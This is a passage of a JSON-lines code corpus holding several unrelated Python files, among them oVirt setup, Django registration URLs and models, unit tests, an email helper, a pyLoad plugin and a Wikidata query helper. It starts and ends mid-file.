wait=True)\n\nhost.refresh()\n\nstorages = host.storage.list()\nif len(storages) == 1 and storages[0].type.name == 'FCP' and storages[0].type.name == 'FCP' and storages[0].logical_units[0].status.name == 'FREE':\n    lu = {'id': storages[0].id}\n    vg = {'logical_units': [lu]}\n    storage = {'type': 'FCP', 'volume_group': vg}\n    sd = {'name': host_name, 'type': 'DATA', 'data_center': dc, 'host': host, 'storage': storage}\n    sd = context.storagedomains.add(storage_domain={'name': host_name, 'type': 'DATA', 'data_center': dc, 'host': host, 'storage': storage})\nelse:\n    sd = context.storagedomains.get(host_name)\n\nevents_returned = []\nwaiting_events = [EventsCode.VDS_DETECTED]\nif(host.status.name != 'UP'):\n    with event_waiter(context, \"host.name=%s\" % host_name, events_returned, verbose=True, break_on=waiting_events):\n        print(events_returned)\n\nif sd.status is not None and sd.status.value == 'unattached':\n    futurs.append(dc.storage_domains.add(storage_domain=sd, wait=False))\n\nif host.hardware_information.product_name is not None and len(list(host.fence_agents.list())) == 0:\n    fence_agent_type={'ProLiant DL185 G5': 'ipmilan'}[host.hardware_information.product_name]\n    futurs.append(host.fence_agents.add(agent={'address': host_name + \"-ilo\", 'username': 'admin', 'password': 'password', 'type': fence_agent_type, 'order': 1}, wait=False))\n\nfor f in futurs:\n    pf.wait()\n\n"}
{"text": "\"\"\"\nA script to generate the file needed for the strategy documentation.\n\nRun:\n\n    python strategies.py > strategies.rst\n\"\"\"\nimport os\nimport sys\n\nsys.path.insert(0, os.path.abspath(\"../\"))\nfrom axelrod import basic_strategies\nfrom axelrod import ordinary_strategies\nfrom axelrod import cheating_strategies\n\n\ndef print_header(string, character):\n    print string\n    print character * len(string)\n    print \"\"\n\n\nif __name__ == \"__main__\":\n\n    print \".. currentmodule:: axelrod.strategies\"\n    print_header(\"Here is a list of strategies\", '=')\n\n    print_header(\"Here are some of the basic strategies\", '-')\n    for strategy in basic_strategies:\n        print \".. autoclass:: %s\" % strategy.__name__\n\n    print \"\"\n\n    print_header(\"A list of all further (honest) strategies\", '-')\n    for strategy in ordinary_strategies:\n        print \".. autoclass:: %s\" % strategy.__name__\n\n    print \"\"\n\n    print_header(\"A list of the cheating strategies\", '-')\n    for strategy in cheating_strategies:\n        print \".. autoclass:: %s\" % strategy.__name__\n"}
{"text": "# -*- encoding: utf-8 -*-\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\nimport falcon\nfrom oslo_serialization import jsonutils\n\nfrom tests.functional import base\n\nfrom partizan.db import models\n\n\nclass CategoryTest(base.BaseTest):\n    def test_create(self):\n        data = {\n            \"name\": \"IC\"\n        }\n        response = self.simulate_post('/categories', body=data)\n        body = jsonutils.loads(response[0])\n\n        self.assertEqual(self.srmock.status, falcon.HTTP_201)\n        self.assertEqual(data[\"name\"], body[\"name\"])\n        self.assertIn(\"id\", body)\n        self.assertIn(\"updated_at\", body)\n        self.assertIn(\"created_at\", body)\n        self.assertIn(\"created_at\", body)\n\n    def test_get(self):\n        data = {\n            \"name\": \"IC\"\n        }\n\n        obj = models.Category.create(data)\n\n        response = self.simulate_get('/categories/%s' % obj.id)\n        body = jsonutils.loads(response[0])\n\n        self.assertEqual(self.srmock.status , falcon.HTTP_200)\n        self.assertEqual(data[\"name\"], body[\"name\"])\n        self.assertIn(\"id\", body)\n        self.assertIn(\"updated_at\", body)\n        self.assertIn(\"created_at\", body)\n        self.assertIn(\"created_at\", body)\n\n    def test_list(self):\n        items = [\n            {\n                \"name\": \"Resistors\"\n            },\n            {\n                \"name\": \"IC\"\n            }\n        ]\n\n        for i in items:\n            obj = models.Category.create(i)\n\n        response = self.simulate_get('/categories')\n        body = jsonutils.loads(response[0])\n\n        self.assertEqual(self.srmock.status , falcon.HTTP_200)\n\n        for i in xrange(0, len(items)):\n            item = body[\"categories\"][i]\n            self.assertEqual(items[i][\"name\"], item[\"name\"])\n            self.assertIn(\"id\", item)\n            self.assertIn(\"updated_at\", item)\n            self.assertIn(\"created_at\", item)\n            self.assertIn(\"created_at\", item)\n\n    def test_delete(self):\n        data = {\n            \"name\": \"IC\"\n        }\n\n        obj = models.Category.create(data)\n\n        response = self.simulate_delete('/categories/%s' % obj.id)\n\n        self.assertEqual(self.srmock.status, falcon.HTTP_204)\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Import smtplib for the actual sending function\nimport sys, os\nimport smtplib\nimport email\n# Import the email modules we'll need\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.header import Header\n\ndef sendEmail(fromEmail=\"\", password=None, toEmails=[], smtp=\"smtp.gmail.com\",\\\n              port=25, msg=\"\"):\n\n    server = smtplib.SMTP(smtp, port)\n    server.ehlo()\n    if password!=None:\n        server.starttls()\n        server.login(fromEmail, password)\n\n    server.sendmail(fromEmail, toEmails, msg.as_string())\n    server.close()\n\nif __name__=='__main__':\n    pass\n\n    \"\"\"fromEmail = \"noreply@malmo.se\" #\"johanlahti@gmail.com\"\n    password = None\n    smtp = \"mail2.malmo.se\"\n    port = 25\n    toEmails = [\"johan.lahti@malmo.se\"]\n    subject = \"Testar \u00c5\u00c4\u00d6 \u00e5\u00e4\u00f6\"\n    content = \"\u00c5\u00c4\u00d6 \u00e5\u00e4\u00f6 Nu testar jag skicka en l\u00e4nk...\\n\\n/Johan\"\n\n    msg = MIMEText(content, \"plain\", \"utf-8\")\n    msg['Subject'] = subject\n    msg['From'] = fromEmail\n    msg['To'] = \";\".join(toEmails)\n\n    sendEmail(fromEmail, password, \\\n              toEmails=toEmails, msg=msg, \\\n              smtp=smtp, port=port)\"\"\"\n              \n"}
{"text": "# -*- coding: utf-8 -*-\n\nimport re\n\nfrom module.plugins.internal.Addon import Addon\n\n\nclass JustPremium(Addon):\n    __name__    = \"JustPremium\"\n    __type__    = \"hook\"\n    __version__ = \"0.24\"\n    __status__  = \"testing\"\n\n    __config__ = [(\"activated\", \"bool\", \"Activated\"                        , False),\n                  (\"excluded\" , \"str\" , \"Exclude hosters (comma separated)\", \"\"   ),\n                  (\"included\" , \"str\" , \"Include hosters (comma separated)\", \"\"   )]\n\n    __description__ = \"\"\"Remove not-premium links from added urls\"\"\"\n    __license__     = \"GPLv3\"\n    __authors__     = [(\"mazleu\"        , \"mazleica@gmail.com\"),\n                       (\"Walter Purcaro\", \"vuolter@gmail.com\" ),\n                       (\"immenz\"        , \"immenz@gmx.net\"    )]\n\n\n    def init(self):\n        self.event_map = {'linksAdded': \"links_added\"}\n\n\n    def links_added(self, links, pid):\n        hosterdict = self.pyload.pluginManager.hosterPlugins\n        linkdict   = self.pyload.api.checkURLs(links)\n\n        premiumplugins = set(account.type for account in self.pyload.api.getAccounts(False) \\\n                             if account.valid and account.premium)\n        multihosters   = set(hoster for hoster in self.pyload.pluginManager.hosterPlugins \\\n                             if 'new_name' in hosterdict[hoster] \\\n                             and hosterdict[hoster]['new_name'] in premiumplugins)\n\n        excluded = map(lambda domain: \"\".join(part.capitalize() for part in re.split(r'(\\.|\\d+)', domain) if part != '.'),\n                       self.get_config('excluded').replace(' ', '').replace(',', '|').replace(';', '|').split('|'))\n        included = map(lambda domain: \"\".join(part.capitalize() for part in re.split(r'(\\.|\\d+)', domain) if part != '.'),\n                       self.get_config('included').replace(' ', '').replace(',', '|').replace(';', '|').split('|'))\n\n        hosterlist = (premiumplugins | multihosters).union(excluded).difference(included)\n\n        #: Found at least one hoster with account or multihoster\n        if not any( True for pluginname in linkdict if pluginname in hosterlist ):\n            return\n\n        for pluginname in set(linkdict.keys()) - hosterlist:\n            self.log_info(_(\"Remove links of plugin: %s\") % pluginname)\n            for link in linkdict[pluginname]:\n                self.log_debug(\"Remove link: %s\" % link)\n                links.remove(link)\n"}
{"text": "\"\"\"\nURLConf for Django user registration.\n\nRecommended usage is to use a call to ``include()`` in your project's\nroot URLConf to include this URLConf for any URL beginning with\n'/accounts/'.\n\n\"\"\"\n\nfrom django.conf.urls import *\nfrom django.urls import reverse_lazy\nfrom django.views.generic import TemplateView\nfrom django.contrib.auth import views as auth_views\n\n# local imports\nfrom signbank.registration.views import activate, register, mylogin, users_without_dataset\nfrom signbank.registration.forms import RegistrationForm\n\n#It's weird that I have to set the correct success url by hand, but it doesn't work any other way\npassword_reset_view = auth_views.PasswordResetView\npassword_reset_view.success_url = reverse_lazy('registration:password_reset_done')\npassword_reset_confirm_view = auth_views.PasswordResetConfirmView\npassword_reset_confirm_view.success_url = reverse_lazy('registration:password_reset_complete')\n\napp_name = 'signbank'\n\nurlpatterns = [\n                       # Activation keys get matched by \\w+ instead of the more specific\n                       # [a-fA-F0-9]+ because a bad activation key should still get to the view;\n                       # that way it can return a sensible \"invalid key\" message instead of a\n                       # confusing 404.\n                       url(r'^activate/(?P<activation_key>\\w+)/$',\n                           activate,\n                           name='registration_activate'),\n                       url(r'^login/$',\n                           mylogin,\n                           {'template_name': 'registration/login.html'},\n                           name='auth_login'),\n                       url(r'^logout/$',\n                           auth_views.logout,\n                           {'template_name': 'registration/logout.html'},\n                           name='auth_logout'),\n                       url(r'^password/change/$',\n                           auth_views.PasswordChangeView.as_view(),\n                           name='auth_password_change'),\n                       url(r'^password/change/done/$',\n                           auth_views.PasswordChangeDoneView.as_view(),\n                           name='auth_password_change_done'),\n                       url(r'^password/reset/$',\n                           password_reset_view.as_view(),\n                           name='auth_password_reset'),\n                       url(r'^password/reset/(?P<uidb64>[0-9A-Za-z]+)-(?P<token>.+)/$',\n                           password_reset_confirm_view.as_view(),\n                           name='password_reset_confirm'),\n                       \n                       url(r'^password/reset/complete/$',\n                           auth_views.PasswordResetCompleteView.as_view(),\n                           name='password_reset_complete'),\n\n                       url(r'^password/reset/done/$',\n                           auth_views.PasswordResetDoneView.as_view(),\n                           name='password_reset_done'),\n\n                       \n                       url(r'^register/$',\n                           register,\n                           name='registration_register',\n                           kwargs = {\n                               'form_class': RegistrationForm,\n                             },\n                           ),\n\n                           \n                       url(r'^register/complete/$',\n                           TemplateView.as_view(template_name='registration/registration_complete.html'),\n                           name='registration_complete'),\n\n                        url(r'^users_without_dataset/$',users_without_dataset, name='users_without_dataset')\n                       ]\n"}
{"text": "\"\"\"\nThis test module contains test cases for testing the conftest.py module,\nat least those functions that can reasonably be tested in a standalone\nmanner.\n\"\"\"\n\nfrom __future__ import print_function, absolute_import\n\nfrom lxml import etree\n\nfrom ...functiontest.conftest import xml_embed, xml_unembed\n\n\nclass Test_EmbedUnembed(object):\n    \"\"\"Test case for xml_embed() / xml_unembed() functions.\"\"\"\n\n    @staticmethod\n    def test_unembed_simple():\n        \"\"\"Unembed a simple embedded instance string.\"\"\"\n\n        emb_str = b'&lt;INSTANCE NAME=&quot;C1&quot;&gt;' \\\n                  b'&lt;PROPERTY NAME=&quot;P1&quot;&gt;' \\\n                  b'&lt;VALUE&gt;V1&lt;/VALUE&gt;' \\\n                  b'&lt;/PROPERTY&gt;' \\\n                  b'&lt;/INSTANCE&gt;'\n\n        instance_elem = xml_unembed(emb_str)\n\n        assert instance_elem.tag == 'INSTANCE'\n        assert len(instance_elem.attrib) == 1\n        assert 'NAME' in instance_elem.attrib\n        assert instance_elem.attrib['NAME'] == 'C1'\n\n        assert len(instance_elem) == 1\n        property_elem = instance_elem[0]\n        assert property_elem.tag == 'PROPERTY'\n        assert len(property_elem.attrib) == 1\n        assert 'NAME' in property_elem.attrib\n        assert property_elem.attrib['NAME'] == 'P1'\n\n        assert len(property_elem) == 1\n        value_elem = property_elem[0]\n        assert value_elem.tag == 'VALUE'\n        assert len(value_elem.attrib) == 0  # pylint: disable=len-as-condition\n        assert value_elem.text == 'V1'\n\n    @staticmethod\n    def test_embed_simple():\n        \"\"\"Embed a simple instance.\"\"\"\n\n        instance_elem = etree.Element('INSTANCE')\n        instance_elem.attrib['NAME'] = 'C1'\n        property_elem = etree.SubElement(instance_elem, 'PROPERTY')\n        property_elem.attrib['NAME'] = 'P1'\n        value_elem = etree.SubElement(property_elem, 'VALUE')\n        value_elem.text = 'V1'\n\n        emb_str = xml_embed(instance_elem)\n\n        exp_emb_str = b'&lt;INSTANCE NAME=&quot;C1&quot;&gt;' \\\n                      b'&lt;PROPERTY NAME=&quot;P1&quot;&gt;' \\\n                      b'&lt;VALUE&gt;V1&lt;/VALUE&gt;' \\\n                      b'&lt;/PROPERTY&gt;' \\\n                      b'&lt;/INSTANCE&gt;'\n\n        assert emb_str == exp_emb_str\n"}
{"text": "#/usr/bin/python\n# -*- coding: utf-8 -*-\n\n\"\"\"! @package utils.uid\n\"\"\"\n\n# Get command line arguments\nfrom optparse import OptionParser\nparser = OptionParser()\nparser.add_option(\"-i\", \"--input\", dest=\"input\", action=\"store\", help=\"input MDF file\")\nparser.add_option(\"-o\", \"--output\", dest=\"output\", action=\"store\", help=\"output MDF file\")\noptions = parser.parse_args()[0]\n\n# Open input and output files\ntry:\n    in_file = open(options.input, \"r\", encoding='utf-8')\n    out_file = open(options.output, \"w\", encoding='utf-8')\nexcept TypeError:\n    in_file = open(options.input, \"r\")\n    out_file = open(options.output, \"w\")\n\n# Define EOL depending on operating system\nimport os\nif os.name == 'posix':\n    # Unix-style end of line\n    EOL = '\\n'\nelse:\n    # Windows-style end of line\n    EOL = '\\r\\n'\n\nimport sys\nsys.path.append('./pylmflib/utils/ipa2sampa')\nfrom ipa2sampa import uni2sampa\n\n# To generate UID, we need to keep values of 'lx' and 'hm'\nimport re\npattern = r\"^\\\\(\\w{2,3}) ?(.*)$\"\nlx = \"\"\nmkr = \"lx\"\nsf = []\nhm = \"\"\nfor line in in_file.readlines():\n    result = re.search(pattern, line)\n    if result:\n        if result.group(1) == \"lx\" or result.group(1) == \"se\":\n            lx = result.group(2)\n            if result.group(1) == \"se\":\n                mkr = \"se\"\n        elif result.group(1) == \"sf\":\n            sf.append(result.group(2))\n        elif result.group(1) == \"hm\":\n            hm = result.group(2)\n            if lx != \"\":\n                # Generate UID and remove spaces around separation character\n                uid = uni2sampa(lx).replace(\" | \", \"|\")\n                # Concatenate homonym number if any, otherwise add '1'\n                uid += str(hm)\n                if hm == \"\":\n                    uid += str(\"1\")\n                out_file.write(\"\\\\\" + mkr + \" <id=\\\"\" + uid.encode('utf-8') + \"\\\"> \" + lx + EOL)\n                out_file.write(\"\\\\sf \" + uid.replace('|', u\"\u20ac\").replace('?', 'Q').replace('*', 'F').encode('utf-8') + \".wav\" + EOL)\n                for i in range (0, len(sf)):\n                    out_file.write(\"\\\\sf \" + sf[i] + EOL)\n                out_file.write(\"\\\\hm \" + hm + EOL)\n                # Reset loop variables\n                lx = \"\"\n                mkr = \"lx\"\n                sf = []\n                hm = \"\"\n            else:\n                out_file.write(line)\n        else:\n            out_file.write(line)\n    else:\n        out_file.write(line)\n\n# Do not forget to close files\nin_file.close()\nout_file.close()\n"}
{"text": "#!/usr/bin/env python\n# Evaluating Activity-Entity model\n#\n# By chenxm\n#\nimport os\nimport sys\n\nimport groundtruth\nfrom PyOmniMisc.model.aem import AEM\n\n\ndef print_usage():\n    print(\"Usage: python exHttp.py <omniperf_trace>\")\n\ncut_gap = 8 # sec\ndef modelAEM(etrs):\n    print(\"Modeling AEM ...\")\n    # Modeling traffic with AEM\n    aem  = AEM(etrs, cut_gap)\n    withUA = aem.sessionsWithUA()\n    withoutUA = aem.sessionsWithoutUA()\n\n    forest = {}\n    for ua in withUA:\n        ss = withUA[ua]\n        for el in ss[1:]:\n            trees = aem.model(el)\n            if ua not in forest:\n                forest[ua] = []\n            forest[ua].extend(trees)\n\n    for host in withoutUA:\n        nss = withoutUA[host]\n        for el in nss[1:]:\n            trees = aem.model(el)\n            if host not in forest:\n                forest[host] = []\n            forest[host].extend(trees)\n    return forest\n\n# Options\nif len(sys.argv) < 2:\n    print_usage()\n    sys.exit(-1)\n\n# Http log file\ninput_folder = sys.argv[1]\nhl = os.path.join(input_folder, 'http_logs')\nif not os.path.exists(hl):\n    raise Exception(\"Sry, I do not find *http_logs*.out in given folder.\")\n# Read http logs\netrs = groundtruth.readHttpEntries(hl)\nif len(etrs) == 0:\n    print(\"No entries\")\n    sys.exit(-1)\n\nforest = modelAEM(etrs)\nforest_gt = groundtruth.modelGT(input_folder)\nfms = groundtruth.evaluate(forest, forest_gt)\nof = open(\"perf-aem-c%d.out\" % cut_gap, \"ab\")\nfor fm in fms:\n\tif fm != 0:\n\t\tof.write(\"%.3f\\n\" % fm)"}
{"text": "from .protocol import *\nimport PyQt5\n\n\nclass Camera:\n    def __init__(self, camera_dict):\n        self.name = camera_dict['n']\n        self.address = camera_dict['a']\n\n    def __str__(self):\n        return '{} [{}]'.format(self.name, self.address)\n\n    def __repr__(self):\n        return self.__str__()\n\n\n@protocol(area='Driver', packets=['CameraList', 'CameraListReply', 'GetCameraName', 'GetCameraNameReply', 'ConnectCamera', 'ConnectCameraReply', \\\n                                  'CloseCamera', 'signalDisconnected', 'signalCameraConnected', 'signalFPS', 'signalTemperature', 'signalControlChanged', \\\n                                  'GetControls', 'GetControlsReply', 'GetProperties', 'GetPropertiesReply', 'StartLive', 'StartLiveReply', 'SetControl', \\\n                                  'SetROI', 'ClearROI'])\nclass DriverProtocol:\n\n    def camera_list(self):\n        return [Camera(x) for x in self.client.round_trip(self.packet_cameralist.packet(), self.packet_cameralistreply).variant]\n\n    def connect_camera(self, camera):\n        self.client.send(self.packet_connectcamera.packet(variant=camera.address))\n\n    def close_camera(self):\n        self.client.send(self.packet_closecamera.packet())\n\n    def get_camera_name(self):\n        return self.client.round_trip(self.packet_getcameraname.packet(), self.packet_getcameranamereply).variant\n\n    def get_controls(self):\n        return self.client.round_trip(self.packet_getcontrols.packet(), self.packet_getcontrolsreply).variant\n\n    def set_control(self, control):\n        self.client.send(self.packet_setcontrol.packet(variant=control))\n\n    def set_roi(self, x, y, width, height):\n        self.client.send(self.packet_setroi.packet(variant=PyQt5.QtCore.QRect(x, y, width, height)))\n\n    def clear_roi(self):\n        self.client.send(self.packet_clearroi.packet())\n\n    def get_properties(self):\n        return self.client.round_trip(self.packet_getproperties.packet(), self.packet_getpropertiesreply).variant\n\n    def start_live(self):\n        return self.client.round_trip(self.packet_startlive.packet(), self.packet_startlivereply)\n\n    def on_signal_fps(self, callback):\n        def dispatch(packet): callback(packet.variant)\n        Protocol.register_packet_handler(self.client, self.packet_signalfps, dispatch)\n\n    def on_camera_connected(self, callback):\n        def dispatch(_): callback()\n        Protocol.register_packet_handler(self.client, self.packet_signalcameraconnected, dispatch)\n\n    def on_camera_disconnected(self, callback):\n        def dispatch(_): callback()\n        Protocol.register_packet_handler(self.client, self.packet_signaldisconnected, dispatch)\n\n    def on_signal_temperature(self, callback):\n        def dispatch(packet): callback(packet.variant)\n        Protocol.register_packet_handler(self.client, self.packet_signaltemperature, dispatch)\n\n    def on_control_changed(self, callback):\n        def dispatch(packet): callback(packet.variant)\n        Protocol.register_packet_handler(self.client, self.packet_signalcontrolchanged, dispatch)\n\n"}
{"text": "# Import the perl module so we can call the SPADS Plugin API\nimport perl\n\n# perl.MyConfigurablePlugin is the Perl representation of the MyConfigurablePlugin plugin module\n# We will use this object to call the plugin API\nspads=perl.MyConfigurablePlugin\n\n\n# This is the first version of the plugin\npluginVersion='0.1'\n\n# This plugin requires a SPADS version which supports Python plugins\n# (only SPADS versions >= 0.12.29 support Python plugins)\nrequiredSpadsVersion='0.12.29'\n\n# We define one global setting \"MyGlobalSetting\" and one preset setting \"MyPresetSetting\".\n# Both are of type \"notNull\", which means any non-null value is allowed\n# (check %paramTypes hash in SpadsConf.pm for a complete list of allowed setting types)\nglobalPluginParams = { 'MyGlobalSetting': ['notNull'] }\npresetPluginParams = { 'MyPresetSetting': ['notNull'] }\n\n\n# This is how SPADS gets our version number (mandatory callback)\ndef getVersion(pluginObject):\n    return pluginVersion\n\n# This is how SPADS determines if the plugin is compatible (mandatory callback)\ndef getRequiredSpadsVersion(pluginName):\n    return requiredSpadsVersion\n\n# This is how SPADS finds what settings we need in our configuration file (mandatory callback for configurable plugins)\ndef getParams(pluginName):\n    return [ globalPluginParams , presetPluginParams ]\n\n\n\n# This is the class implementing the plugin\nclass MyConfigurablePlugin:\n\n    # This is our constructor, called when the plugin is loaded by SPADS (mandatory callback)\n    def __init__(self,context):\n        \n        # We call the API function \"slog\" to log a notice message (level 3) when the plugin is loaded\n        spads.slog(\"Plugin loaded (version %s)\" % pluginVersion,3)\n"}
{"text": "# -*- coding: utf-8 -*-\n# Generated by Django 1.10.5 on 2017-02-26 07:54\nfrom __future__ import unicode_literals\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Article',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('title', models.CharField(max_length=256)),\n                ('tags', models.CharField(max_length=128)),\n                ('content', models.TextField()),\n                ('imgUrl', models.URLField()),\n                ('views', models.PositiveIntegerField()),\n                ('likes', models.IntegerField()),\n                ('createTime', models.DateTimeField(auto_now_add=True)),\n            ],\n            options={\n                'db_table': 'article',\n            },\n        ),\n        migrations.CreateModel(\n            name='AuthorInfo',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('name', models.CharField(max_length=128)),\n                ('introduce', models.CharField(max_length=512)),\n                ('tags', models.CharField(max_length=512)),\n                ('imgUrl', models.URLField()),\n            ],\n            options={\n                'db_table': 'author_info',\n            },\n        ),\n        migrations.CreateModel(\n            name='Comment',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('content', models.CharField(max_length=256)),\n                ('createTime', models.DateTimeField(auto_now_add=True)),\n            ],\n            options={\n                'db_table': 'comment',\n            },\n        ),\n    ]\n"}
{"text": "#!/usr/bin/env python\n# encoding: utf-8\n\nimport os, sys\nfrom setuptools import setup\n\nsetup(\n    # metadata\n    name='pfp',\n    description='An 010 template interpreter for Python',\n    long_description=\"\"\"\n\t\tpfp is an 010 template interpreter for Python. It accepts an\n\t\tinput data stream and an 010 template and returns a modifiable\n\t\tDOM of the parsed data. Extensions have also been added to the\n\t\t010 template syntax to allow for linked fields (e.g. checksums,\n\t\tlength calculations, etc), sub structures in compressed data,\n\t\tetc.\n    \"\"\",\n    license='MIT',\n    version='0.1.11',\n    author='James Johnson',\n    maintainer='James Johnson',\n    author_email='d0c.s4vage@gmail.com',\n    url='https://github.com/d0c-s4vage/pfp',\n    platforms='Cross Platform',\n\tdownload_url=\"https://github.com/d0c-s4vage/pfp/tarball/v0.1.11\",\n\tinstall_requires = open(os.path.join(os.path.dirname(__file__), \"requirements.txt\")).read().split(\"\\n\"),\n    classifiers = [\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',],\n    packages=['pfp', 'pfp.native'],\n)\n"}
{"text": "from lz4ex import lz4, lz4hc\nimport unittest\n\n\nclass TestLZ4(unittest.TestCase):\n    def test_compress_default(self):\n        input_data = b\"2099023098234882923049823094823094898239230982349081231290381209380981203981209381238901283098908123109238098123\"\n        input_data_size = len(input_data)\n        compressed = lz4hc.compress_hc(input_data, lz4hc.COMPRESSIONLEVEL_MAX)\n        decompressed = lz4.decompress_safe(compressed, input_data_size)\n        self.assertEqual(input_data, decompressed)\n\n    def test_create_and_free_stream(self):\n        stream = lz4hc.create_hc_stream(4*1024, lz4hc.COMPRESSIONLEVEL_MAX)\n        self.assertNotEqual(stream, None)\n        lz4hc.free_hc_stream(stream)\n\n    def test_stream_compress(self):\n        input_data = b\"2099023098234882923049823094823094898239230982349081231290381209380981203981209381238901283098908123109238098123\"\n        block_size = int((len(input_data)/2)+1)\n\n        stream = lz4hc.create_hc_stream(block_size, lz4hc.COMPRESSIONLEVEL_MAX)\n        self.assertNotEqual(stream, None)\n\n        compressed_data1 = lz4hc.compress_hc_continue(stream, input_data[:block_size])\n        compressed_data2 = lz4hc.compress_hc_continue(stream, input_data[block_size:])\n\n        lz4hc.free_hc_stream(stream)\n\n        stream = lz4.create_decode_stream(block_size)\n        self.assertNotEqual(stream, None)\n\n        decompressed_data1 = lz4.decompress_safe_continue(stream, compressed_data1)\n        decompressed_data2 = lz4.decompress_safe_continue(stream, compressed_data2)\n\n        lz4.free_decode_stream(stream)\n\n        decompressed_data = decompressed_data1+decompressed_data2\n        self.assertEqual(decompressed_data, input_data)\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "from django.db import models\nfrom django.utils import timezone\nfrom django.contrib.auth.models import User\nfrom django.core.exceptions import ValidationError\n\n\nclass Event(models.Model):\n    '''\n    This model represents an one-time event\n    '''\n    title = models.CharField(max_length=255)\n    description = models.TextField()\n    start = models.DateTimeField()\n    end = models.DateTimeField(\n        blank=True,\n        # validators=[validate_after]\n    )\n    #TODO in view, make logic that end time must be later than start time.\n    location = models.CharField(max_length=100)\n    creator = models.ForeignKey(User, null=True)\n    created = models.DateTimeField(auto_now_add=True)\n    last_updated = models.DateTimeField(auto_now=True)\n\n    def save(self, *args, **kwargs):\n        if not self.end:\n            self.end = self.start + timezone.timedelta(hours=1)\n        super(Event, self).save(*args, **kwargs)\n        if self.end - self.start < timezone.timedelta(0):\n            raise ValidationError('end time must occur after start time, is now occuring {} before'.format(self.end - self.start))\n\n    def __str__(self):\n        return self.title\n\n"}
{"text": "# -*- coding: utf-8 -*-\nimport unittest\n\nfrom nose.plugins.skip import SkipTest\n\ntry:\n    from urllib3.contrib.pyopenssl import (inject_into_urllib3,\n                                           extract_from_urllib3)\nexcept ImportError as e:\n    raise SkipTest('Could not import PyOpenSSL: %r' % e)\n\nfrom mock import patch, Mock\n\n\nclass TestPyOpenSSLInjection(unittest.TestCase):\n    \"\"\"\n    Tests for error handling in pyopenssl's 'inject_into urllib3'\n    \"\"\"\n    def test_inject_validate_fail_cryptography(self):\n        \"\"\"\n        Injection should not be supported if cryptography is too old.\n        \"\"\"\n        try:\n            with patch(\"cryptography.x509.extensions.Extensions\") as mock:\n                del mock.get_extension_for_class\n                self.assertRaises(ImportError, inject_into_urllib3)\n        finally:\n            # `inject_into_urllib3` is not supposed to succeed.\n            # If it does, this test should fail, but we need to\n            # clean up so that subsequent tests are unaffected.\n            extract_from_urllib3()\n\n    def test_inject_validate_fail_pyopenssl(self):\n        \"\"\"\n        Injection should not be supported if pyOpenSSL is too old.\n        \"\"\"\n        try:\n            return_val = Mock()\n            del return_val._x509\n            with patch(\"OpenSSL.crypto.X509\", return_value=return_val):\n                self.assertRaises(ImportError, inject_into_urllib3)\n        finally:\n            # `inject_into_urllib3` is not supposed to succeed.\n            # If it does, this test should fail, but we need to\n            # clean up so that subsequent tests are unaffected.\n            extract_from_urllib3()\n"}
{"text": "#------------------------------------------------------------------------------\n# Copyright (c) 2005-2011, Enthought, Inc.\n# All rights reserved.\n#\n# This software is provided without warranty under the terms of the BSD\n# license included in enthought/LICENSE.txt and may be redistributed only\n# under the conditions described in the aforementioned license.  The license\n# is also available online at http://www.enthought.com/licenses/BSD.txt\n# Thanks for using Enthought open source!\n#\n# Author: Enthought, Inc.\n# Description: <Enthought pyface package component>\n#------------------------------------------------------------------------------\n\nfrom __future__ import absolute_import\n\nfrom .node_event import NodeEvent\nfrom .node_monitor import NodeMonitor\nfrom .node_manager import NodeManager\nfrom .node_tree import NodeTree\nfrom .node_tree_model import NodeTreeModel\nfrom .node_type import NodeType\nfrom .trait_dict_node_type import TraitDictNodeType\nfrom .trait_list_node_type import TraitListNodeType\nfrom .tree_model import TreeModel\n\nfrom traits.etsconfig.api import ETSConfig\nif ETSConfig.toolkit == 'wx':\n    # Tree has not yet been ported to qt\n    from .tree import Tree\n\ndel ETSConfig\n"}
{"text": "\"\"\"@package functions\nView documentation\n\n\"\"\"\nimport requests\nimport re\nfrom  MeancoApp.models import *\n## Gets reference from wikidata and create reference models.\ndef getRefOfTopic(topicName,TopicId):\n    payload = {\n        'action': 'wbsearchentities',\n        'language': 'en',\n        'search': topicName,\n        'format': 'json',\n    }\n    r= requests.get('https://www.wikidata.org/w/api.php', params= payload)\n    idList=list()\n    for i in r.json()['search']:\n        idList.append(i['id'])\n    link=\"https://query.wikidata.org/bigdata/namespace/wdq/sparql\"\n    query='SELECT ?item ?itemLabel WHERE { {} '\n    for i in idList:\n        query+=\"UNION \"\n        query+= \"{wd:\"+i+\" wdt:P279 ?item.}\"\n        query+=\"UNION\"\n        query+=\"{wd:\"+i +\" wdt:P31 ?item.}\"\n    query+=' SERVICE wikibase:label { bd:serviceParam wikibase:language \"en\" } } '\n    r2=requests.get(link,params={'query':query,'format':'json' })\n    for i in r2.json()['results']['bindings']:\n        if 'item' in i :\n            if(i['itemLabel']['value']!=\"Wikimedia disambiguation page\"):\n                q =re.search(\"(Q.+)\",(i['item']['value']))\n                tr =TopicRef(topic_id=TopicId,qId=q.group(0))\n                tr.save()\n## Finds reference from wikidata and create reference models.\ndef findRefTopics(search):\n    payload = {\n        'action': 'wbsearchentities',\n        'language': 'en',\n        'search': search,\n        'format': 'json',\n    }\n    r= requests.get('https://www.wikidata.org/w/api.php', params= payload)\n    idList=list()\n    for i in r.json()['search']:\n        idList.append(i['id'])\n    link=\"https://query.wikidata.org/bigdata/namespace/wdq/sparql\"\n    query='SELECT ?item WHERE { {} '\n    for i in idList:\n        query+=\"UNION 